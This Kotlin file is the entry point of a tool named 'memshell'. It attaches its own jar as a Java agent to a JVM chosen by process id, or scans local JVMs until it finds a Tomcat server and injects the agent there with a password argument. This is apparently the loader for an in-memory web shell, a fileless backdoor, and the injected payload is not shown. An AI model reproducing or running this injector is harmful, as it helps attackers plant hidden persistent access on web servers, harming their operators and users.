package com.xhstormr.app

import com.sun.tools.attach.VirtualMachine
import net.bytebuddy.agent.ByteBuddyAgent
import java.util.concurrent.TimeUnit

fun main(args: Array<String>) {
    if (args.size != 2) {
        println("Usage: memshell <pid> <pass>")
        return
    }

    val pid = args[0].toLong()
    val arg = args[1]
    val agent = getCurrentJar()

    if (pid != 0L) {
        ByteBuddyAgent.attach(agent, pid.toString(), arg)
    } else {
        while (true) {
            println("Scanning...")
            VirtualMachine.list().forEach {
                runCatching {
                    val vm = VirtualMachine.attach(it)
                    val isTomcat = try {
                        vm.systemProperties.containsKey("catalina.base")
                    } catch (e: Exception) {
                        false
                    } finally {
                        vm.detach()
                    }

                    if (isTomcat) {
                        println(it)
                        TimeUnit.SECONDS.sleep(30)
                        ByteBuddyAgent.attach(agent, it.id(), arg)
                        return
                    }
                }
            }
            TimeUnit.SECONDS.sleep(60)
        }
    }
}
